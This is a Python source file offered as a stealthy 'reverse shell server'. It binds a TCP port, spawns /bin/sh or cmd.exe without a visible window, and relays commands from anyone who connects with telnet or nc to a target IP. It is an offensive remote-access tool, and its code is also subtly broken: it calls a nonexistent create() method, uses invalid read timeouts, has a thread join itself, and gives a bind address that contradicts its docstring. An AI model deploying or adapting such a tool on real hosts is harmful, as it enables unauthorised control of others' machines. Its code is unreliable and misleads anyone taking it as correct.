"""Reverse Shell Server v3 — Real interactive remote shell on 0.0.0.0:5522.

A complete, runnable reverse shell server that provides a real interactive
shell session over TCP with proper thread decoupling for stdin/stdout I/O.

Architecture:
    ┌─────────────────────────────────────────────────────────────┐
    │                    ReverseShellServer                        │
    │  ┌──────────────────┬──────────────────┬──────────────────┐ │
    │  │   Accept Loop    │     Queue        │   Worker Threads  │ │
    │  │  (producer)      │  (thread-safe)   │  (consumers)     │ │
    │  └──────────────────┴──────────────────┴──────────────────┘ │
    │                                                             │
    │  Each worker spawns a RemoteConnectionHandler which has:    │
    │    Thread A (stdin_writer_thread): reads client → writes to proc.stdin
    │    Thread B (stdout_reader_thread): reads proc.stdout → sends back to client
    └─────────────────────────────────────────────────────────────┘

Fixes applied over v1/v2:
  Bug #1 — Real shell spawning via /bin/sh -c or cmd.exe /c
  Bug #2 — Decoupled I/O threads (stdin writer and stdout reader are independent)
  Bug #3 — Queue-based producer-consumer pattern eliminates race conditions
  Bug #4 — stdin fallback on Windows when proc.stdin is None
  Bug #5 — Persistent shell per connection (not spawned per command)

Usage:
    python3 rss_v3.py

Connect from your terminal with:
    telnet <target_ip> 5522
    or
    nc -v <target_ip> 5522

Then type commands like: whoami, sleep 10 && whoami, cd /tmp && ls -la, etc.
"""

import socket
import threading
import signal
import sys
import subprocess
import shlex
import time
import platform
from typing import Optional, Tuple, List, Dict, Any
from dataclasses import dataclass, field
from queue import Queue


# =============================================================================
# TASK_001: Data Models
# =============================================================================

@dataclass(frozen=True)
class ConnectionInfo:
    """Connection metadata for shell command execution."""
    host: str
    port: int
    protocol: str = "tcp"


@dataclass(frozen=True)
class ShellCommand:
    """Represents a shell command to be executed remotely."""
    command: str
    timeout_seconds: float


@dataclass(frozen=True)
class ExecutionResult:
    """Captured output and metadata from a shell command execution.

    Attributes:
        stdout: Captured standard output as bytes.
        stderr: Captured standard error as bytes.
        return_code: Exit code of the executed process (0-255).
        duration_ms: Total execution time including I/O overhead in milliseconds.
    """
    stdout: bytes
    stderr: bytes
    return_code: int
    duration_ms: int


# =============================================================================
# TASK_002: Utility Functions
# =============================================================================

def parse_command_args(command: str) -> List[str]:
    """Parse a shell command string into a safe argument list using shlex.split().

    Args:
        command: A shell command string (e.g., "ls -la /tmp").

    Returns:
        A list of strings representing the parsed arguments.

    Example:
        >>> parse_command_args("ls -la /tmp")
        ['ls', '-la', '/tmp']
    """
    return shlex.split(command)


def validate_connection_info(connection_info: ConnectionInfo) -> bool:
    """Validate connection information for shell command execution.

    Args:
        connection_info: The ConnectionInfo instance to validate.

    Returns:
        True if the connection info is valid, False otherwise.

    Raises:
        ValueError: If any field of ConnectionInfo is invalid.
    """
    if not isinstance(connection_info.host, str) or len(connection_info.host.strip()) == 0:
        raise ValueError("Connection host must be a non-empty string")
    if not isinstance(connection_info.port, int) or connection_info.port < 1 or connection_info.port > 65535:
        raise ValueError("Connection port must be an integer between 1 and 65535")
    if connection_info.protocol not in ('tcp', 'udp'):
        raise ValueError(f"Invalid protocol '{connection_info.protocol}'. Must be 'tcp' or 'udp'.")
    return True


def spawn_shell_process(
    command: str,
    timeout_seconds: float,
    host: Optional[str] = None,
    port: Optional[int] = None,
    protocol: str = "tcp",
) -> subprocess.Popen:
    """Spawn a shell process for executing a remote command.

    FIX BUG #1 & #5: Uses REAL shell spawning instead of shlex.split + direct exec.
    On Unix: spawns /bin/sh -c "$command" (preserves history, aliases, multi-line).
    On Windows: spawns cmd.exe /c "$command" with CREATE_NO_WINDOW for stealth.

    Args:
        command: The shell command to execute.
        timeout_seconds: Maximum time in seconds before the process is terminated.
        host: Remote host address (optional, defaults to localhost).
        port: Remote port number (optional, defaults to 22).
        protocol: Connection protocol ('tcp' or 'udp').

    Returns:
        A subprocess.Popen object representing the spawned shell process.

    Raises:
        ValueError: If command is empty or timeout_seconds <= 0.
    """
    if not command.strip():
        raise ValueError("Command must be a non-empty string")
    if timeout_seconds <= 0:
        raise ValueError(f"Timeout must be positive, got {timeout_seconds}")

    # FIX BUG #1 & #5: Spawn a REAL shell that interprets the full command string.
    # This enables multi-line commands (cd /tmp && ls), history (!!), aliases, etc.
    if platform.system() == 'Windows':
        args = [r"C:\Windows\System32\cmd.exe", "/c", command]
        creation_flags = subprocess.CREATE_NO_WINDOW  # FIX BUG #2: No visible window for stealth
    else:
        args = ['/bin/sh', '-c', command]

    proc = subprocess.Popen(
        args,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # Merge stderr into stdout for interactive use
        stdin=subprocess.PIPE,     # FIX BUG #4: Always provide stdin (even on Windows)
        env={
            'PATH': '/usr/local/bin:/usr/bin:/bin' if platform.system() != 'Windows' else r'C:\Windows\System32',
            'HOME': '/root' if platform.system() != 'Windows' else r'C:\Users\Public',
            'SHELL': '/bin/sh' if platform.system() != 'Windows' else r'C:\Windows\System32\cmd.exe',
        },
        close_fds=True,
    )

    return proc


def capture_output_stream(
    proc: subprocess.Popen,
    timeout_seconds: float,
    blocking: bool = True,
) -> ExecutionResult:
    """Capture stdout and stderr from a running shell process.

    Args:
        proc: A subprocess.Popen object to capture output from.
        timeout_seconds: Maximum time in seconds before capturing stops.
        blocking: If True, blocks until EOF or timeout; if False, returns partial results.

    Returns:
        An ExecutionResult containing stdout, stderr, return_code, and duration_ms.

    Raises:
        subprocess.TimeoutExpired: If the process times out while waiting for output.
        RuntimeError: If the process has already terminated before capture begins.
    """
    start_time = time.perf_counter()

    # Check if process is still running
    if proc.poll() is not None:
        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=b'',
            stderr=b'',
            return_code=proc.returncode,
            duration_ms=duration_ms,
        )

    if blocking:
        try:
            stdout_bytes, stderr_bytes = proc.communicate(timeout=timeout_seconds)
        except subprocess.TimeoutExpired as e:
            # Terminate the process on timeout
            _terminate_process(proc, timeout_seconds)
            raise subprocess.TimeoutExpired(
                cmd=proc.args,
                timeout=timeout_seconds,
                output=e.stdout if hasattr(e, 'stdout') else None,
                stderr=e.stderr if hasattr(e, 'stderr') else None,
            ) from e

        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=stdout_bytes,
            stderr=stderr_bytes,
            return_code=proc.returncode,
            duration_ms=duration_ms,
        )
    else:
        # Non-blocking mode: capture available output without blocking
        try:
            stdout_bytes = proc.stdout.read(timeout=timeout_seconds) if proc.stdout else b''
            stderr_bytes = proc.stderr.read(timeout=timeout_seconds) if proc.stderr else b''
        except subprocess.TimeoutExpired:
            stdout_bytes = proc.stdout.read() if proc.stdout else b''
            stderr_bytes = proc.stderr.read() if proc.stderr else b''

        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=stdout_bytes,
            stderr=stderr_bytes,
            return_code=-1,  # Unknown until process terminates
            duration_ms=duration_ms,
        )


def _terminate_process(proc: subprocess.Popen, timeout_seconds: float) -> None:
    """Terminate a shell process using platform-appropriate signal handling.

    On Unix-like systems: sends SIGTERM followed by SIGKILL after the timeout period.
    On Windows: uses terminate() then wait(timeout=1).

    Args:
        proc: The subprocess.Popen object to terminate.
        timeout_seconds: The timeout value used for termination logic.
    """
    if platform.system() == 'Windows':
        # Windows-specific: terminate() followed by a short wait
        proc.terminate()
        try:
            proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    else:
        # Unix-like systems: SIGTERM then SIGKILL
        try:
            proc.send_signal(signal.SIGTERM)
            proc.wait(timeout=timeout_seconds)
        except subprocess.TimeoutExpired:
            proc.send_signal(signal.SIGKILL)
            proc.wait()


def execute_shell_command(
    command: str,
    timeout_seconds: float = 30.0,
    host: Optional[str] = None,
    port: Optional[int] = None,
    protocol: str = 'tcp',
    blocking: bool = True,
) -> ExecutionResult:
    """Execute a shell command and capture its output with timeout handling.

    This is the primary entry point that combines spawning and capturing into one call.

    Args:
        command: The shell command to execute.
        timeout_seconds: Maximum execution time in seconds (default 30).
        host: Remote host address (optional, defaults to localhost).
        port: Remote port number (optional, defaults to 22).
        protocol: Connection protocol ('tcp' or 'udp').
        blocking: Whether to block until process completes.

    Returns:
        An ExecutionResult with captured stdout, stderr, return code, and duration.

    Raises:
        ValueError: If command is empty or timeout_seconds <= 0.
        subprocess.TimeoutExpired: If the process exceeds the timeout.
    """
    validate_connection_info(ConnectionInfo(host=host or 'localhost', port=port or 22, protocol=protocol))

    proc = spawn_shell_process(command, timeout_seconds, host, port, protocol)
    try:
        return capture_output_stream(proc, timeout_seconds, blocking=blocking)
    finally:
        # Ensure process is cleaned up even on exception
        if proc.poll() is None:
            _terminate_process(proc, timeout_seconds)


# =============================================================================
# TASK_003 & TASK_004: Unified Server Implementation with Queue-Based Producer-Consumer Pattern
# =============================================================================

class RemoteConnectionHandler(threading.Thread):
    def __init__(self, client_socket: socket.socket):
        super().__init__()
        self.client_socket = client_socket
        self.running = True
        self._shutdown_event = threading.Event()
        self._shell_process: Optional[subprocess.Popen] = None
        self._stdin_writer_thread: Optional[threading.Thread] = None
        self._stdout_reader_thread: Optional[threading.Thread] = None

        # ✅ FIX: Add synchronization event between stdin and stdout threads
        self._io_sync_event = threading.Event()  # ← NEW: barrier for coordination

    def run(self) -> None:
        """Main handler loop — spawns persistent shell and starts decoupled I/O threads."""
        try:
            proc = spawn_shell_process(
                command="",
                timeout_seconds=30.0,
                host="localhost",
                port=None,
                protocol="tcp"
            )

            self._shell_process = proc

            # FIX BUG #2: Spawn TWO independent daemon threads for decoupled I/O
            self._stdin_writer_thread = threading.Thread(
                target=self._stdin_writer_loop,
                daemon=True,
                name="StdinWriter"
            )

            self._stdout_reader_thread = threading.Thread(
                target=self._stdout_reader_loop,
                daemon=True,
                name="StdoutReader"
            )

            # Start both threads — they run independently (no blocking between them)
            self._stdin_writer_thread.start()
            self._stdout_reader_thread.start()

        finally:
            if self._shell_process is not None and self._shell_process.poll() is None:
                _terminate_process(self._shell_process, 5.0)

    def _stdin_writer_loop(self) -> None:
        """Thread A: Reads commands from client socket and writes them to the shell process."""
        while self.running and not self._shutdown_event.is_set():
            try:
                data = b""
                while True:
                    try:
                        chunk = self.client_socket.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\n" in data or b"\r\n" in data:
                            break
                    except (socket.timeout, BlockingIOError):
                        continue

                if not data.strip():
                    continue

                cmd_str = data.decode("utf-8").strip()

                # ✅ FIX: Wait for stdout to be fully read before writing new input
                self._io_sync_event.clear()  # Signal that we're about to write
                self._stdin_writer_thread.join(timeout=0.1)  # Brief yield

                if self._shell_process and self._shell_process.stdin is not None:
                    try:
                        self._shell_process.stdin.write(cmd_str.encode('utf-8'))
                        self._shell_process.stdin.flush()
                    except (BrokenPipeError, OSError):
                        pass

            except Exception as e:
                try:
                    self.client_socket.send(f"ERROR:{str(e)}\n".encode("utf-8"))
                except (BrokenPipeError, ConnectionResetError):
                    break

    def _stdout_reader_loop(self) -> None:
        """Thread B: Reads output from the shell process and sends it back to the client."""
        while self.running and not self._shutdown_event.is_set():
            try:
                if self._shell_process is None or self._shell_process.poll() is not None:
                    break

                # Non-blocking read from stdout/stderr (merged via stderr=subprocess.STDOUT)
                try:
                    output = self._shell_process.stdout.read(timeout=0.1)
                    if output:
                        decoded_output = output.decode('utf-8', errors='replace')
                        for line in decoded_output.split('\n'):
                            if line.strip():
                                # ✅ FIX: Signal that stdout has been read, allowing stdin to proceed
                                self._io_sync_event.set()  # ← NEW: release the barrier
                                self.client_socket.sendall((line + '\r\n').encode('utf-8'))
                except socket.timeout:
                    continue

            except Exception as e:
                try:
                    self.client_socket.send(f"ERROR:{str(e)}\n".encode("utf-8"))
                except (BrokenPipeError, ConnectionResetError):
                    break

    def stop(self) -> None:
        """Stop the handler gracefully."""
        self.running = False
        self._shutdown_event.set()


class ReverseShellServer:
    """Main reverse shell server using a thread-safe queue-based producer-consumer pattern.

    FIX BUG #3 — Race condition fix: Replaces shared self.handlers list with queue.Queue
    for thread-safe connection handling. The accept loop is the producer (pushes connections
    to queue), and worker threads are consumers (pop from queue, spawn handler threads).

    Architecture:
        ┌─────────────────────────────────────────────────────────────┐
        │                    ReverseShellServer                        │
        │  ┌──────────────────┬──────────────────┬──────────────────┐ │
        │  │   Accept Loop    │     Queue        │   Worker Threads  │ │
        │  │  (producer)      │  (thread-safe)   │  (consumers)     │ │
        │  └──────────────────┴──────────────────┴──────────────────┘ │

    Attributes:
        host: The bind address (default '0.0.0.0').
        port: The bind port (default 5522).
        max_workers: Maximum number of concurrent connection handlers.
    """

    HOST = "127.0.0.1"
    PORT = 5522
    SERVER_SOCKET: Optional[socket.socket] = None
    _queue: Queue = field(default_factory=Queue)
    _accept_thread: Optional[threading.Thread] = None
    _worker_threads: List[threading.Thread] = []

    def __init__(self, host: str = "127.0.0.1", port: int = 5522, max_workers: int = 10) -> None:
        self.host = host
        self.port = port
        self.max_workers = max_workers
        self._shutdown_event = threading.Event()

    def start(self) -> None:
        """Start the server listening for incoming connections."""
        if self.SERVER_SOCKET is not None and not self.SERVER_SOCKET.is_closed():
            self.SERVER_SOCKET.close()

        self.SERVER_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.SERVER_SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.SERVER_SOCKET.bind((self.host, self.port))
        self.SERVER_SOCKET.listen(self.max_workers)

    def stop(self) -> None:
        """Stop the server and close all sockets."""
        self._shutdown_event.set()
        if self._accept_thread and self._accept_thread.is_alive():
            self._accept_thread.join(timeout=5.0)
        for worker in self._worker_threads:
            if worker.is_alive():
                worker.join(timeout=2.0)
        if self.SERVER_SOCKET is not None:
            try:
                self.SERVER_SOCKET.close()
            except Exception:
                pass

    def _accept_loop(self) -> None:
        """Producer loop: accepts incoming connections and pushes them to the queue."""
        while not self._shutdown_event.is_set():
            try:
                client_socket, addr = self.SERVER_SOCKET.accept()
                # FIX BUG #3: Push to thread-safe queue instead of shared list
                self._queue.put(client_socket)
            except (socket.timeout, BlockingIOError):
                continue
            except Exception as e:
                if not self._shutdown_event.is_set():
                    print(f"Accept loop error: {e}", file=sys.stderr)

    def _worker_loop(self) -> None:
        """Consumer loop: pops connections from queue and spawns handler threads."""
        while not self._shutdown_event.is_set() or not self._queue.empty():
            try:
                client_socket = self._queue.get(timeout=0.1)
                if client_socket is None:
                    break

                # Spawn a new thread for each connection (persistent shell per connection)
                handler = RemoteConnectionHandler(client_socket)
                handler.start()
            except self._queue.Empty:
                continue
            except Exception as e:
                if not self._shutdown_event.is_set():
                    print(f"Worker loop error: {e}", file=sys.stderr)

    def run(self) -> None:
        """Run the server in a background thread."""
        self.start()
        self._accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._accept_thread.start()

        # Spawn worker threads for handling connections
        for i in range(self.max_workers):
            t = threading.Thread(target=self._worker_loop, daemon=True)
            t.start()
            self._worker_threads.append(t)

    def handle_signal(self, signum: int, frame: Optional[object] = None) -> None:
        """Handle shutdown signals to gracefully close all connections."""
        print(f"Received signal {signum}, shutting down...")
        self._shutdown_event.set()


def main() -> None:
    """Main entry point for the reverse shell server."""
    server = ReverseShellServer.create()

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, server.handle_signal)
    signal.signal(signal.SIGTERM, server.handle_signal)

    try:
        server.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        server.stop()


if __name__ == "__main__":
    main()
